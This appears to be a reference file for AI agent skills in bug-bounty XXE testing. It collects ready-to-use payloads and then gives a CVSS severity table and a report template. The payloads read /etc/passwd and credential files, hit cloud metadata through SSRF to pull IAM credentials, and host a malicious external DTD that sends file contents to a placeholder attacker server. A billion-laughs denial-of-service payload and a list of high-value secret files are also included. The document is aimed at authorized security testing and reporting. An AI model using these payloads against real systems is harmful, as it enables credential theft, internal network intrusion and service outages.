# Payloads, Severity, and Report Template

## Basic file read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><data>&xxe;</data></root>
```

## High-value file targets

```
Linux:       /etc/passwd   /etc/hostname   /proc/self/environ
Windows:     C:/Windows/win.ini   C:/Windows/System32/drivers/etc/hosts   web.config
Application: .env   config.php   application.properties   settings.py
```

## SSRF via XXE

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<root><data>&xxe;</data></root>
```

## Blind detection (OAST)

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://YOUR-OAST-DOMAIN/probe"> ]>
<root><data>&xxe;</data></root>
```

## Out-of-band exfiltration (malicious external DTD, hosted on your server)

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER/?data=%file;'>">
%eval;
%exfil;
```
Referenced via:
```xml
<!DOCTYPE foo [ <!ENTITY % dtd SYSTEM "http://YOUR-SERVER/evil.dtd"> %dtd; ]>
<root></root>
```

## Parameter entity (basic)

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>
```

## XInclude (no DOCTYPE needed)

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

## SVG XXE

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```

## Billion laughs (DoS — test with explicit authorization only)

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
]>
<lolz>&lol2;</lolz>
```

## Content-type smuggling probe

```
Original: Content-Type: application/x-www-form-urlencoded   foo=bar
Try:      Content-Type: text/xml
          <?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

## Tools

| Tool | Use |
|---|---|
| Burp Collaborator / `interactsh-client` | OAST detection and OOB exfiltration |
| Burp "Content Type Converter" extension | Convert JSON/form requests to XML to probe content-type smuggling |
| `oxml_xxe` | Embed XXE payloads into DOCX/XLSX/PPTX/ODT/ODS/ODP/SVG/PDF automatically |
| `dtd-finder` | Enumerate local DTD files on a target OS to support local-DTD error-based extraction |

---

## CVSS 3.1 quick reference for common XXE findings

| Finding | Typical CVSS range | Severity |
|---|---|---|
| In-band file read of a generic/non-sensitive file | ~5.3–6.5 | Medium |
| In-band or OOB-confirmed disclosure of credentials/config (`.env`, etc.) | ~7.5–8.8 | High |
| SSRF via XXE reaching internal services only | ~6.5–7.5 | Medium–High |
| SSRF via XXE reaching cloud metadata, credentials extracted | ~9.0–9.8 | Critical |
| Blind XXE, OAST-confirmed only (no data exfiltrated yet) | ~5.3–6.5 | Medium |
| Blind XXE with confirmed OOB file exfiltration | ~7.5–9.1 | High–Critical |
| XXE escalated to RCE (expect://, chained path-traversal write) | ~9.1–9.8 | Critical |
| Billion-laughs DoS, controlled/limited demonstration | ~5.3–7.5 | Medium–High, depending on availability impact shown |
| DOCTYPE accepted with no confirmed entity resolution | n/a | Not yet a finding — see validation gate in `SKILL.md` |

## Full report template

```markdown
**Title**: XXE in [exact endpoint/feature] allows [actor] to [impact]

## Summary
2-3 plain sentences: the endpoint/feature, how XML parsing was
reached (direct, content-type smuggling, or file upload), and what
was actually recovered or achieved.

## Steps to Reproduce
1. Send: [exact request — method, path, headers, body, or the
   crafted upload file]
2. Observe: [exact response, OAST interaction log, or confirmed
   backend effect]
3. [If blind] Include the external-DTD/exfiltration setup used

## Proof of Concept
Request/response pair, the malicious DTD file content if used, and
the OAST interaction log for blind findings.

## Impact
State precisely what was read, reached, or executed — a specific
file's contents (redact live secrets, describe their type), a
specific internal service/metadata endpoint reached, or a specific
command's output if escalated to RCE.

## Suggested Fix
One or two sentences specific to the parser/library in use — e.g.,
"Disable DTD processing and external entity resolution in the XML
parser configuration (e.g., `disallow-doctype-decl=true` for Java,
`libxml_disable_entity_loader(true)` for PHP, `resolve_entities=False`
for Python's lxml)."

## Severity Assessment
CVSS 3.1: X.X ([Severity label]) — see table above for basis
```

### Tone notes

- Lead with what was actually recovered or reached, not an XXE tutorial.
- Redact live secrets found in disclosed files; describe their type and source.
- For blind findings, be precise about what's confirmed (entity resolution) vs. demonstrated (actual exfiltrated content) — don't conflate the two.
- If escalated toward RCE, state plainly that you stopped at minimal, non-destructive proof.
- Keep it under ~600 words, consistent with the other skills in this set.
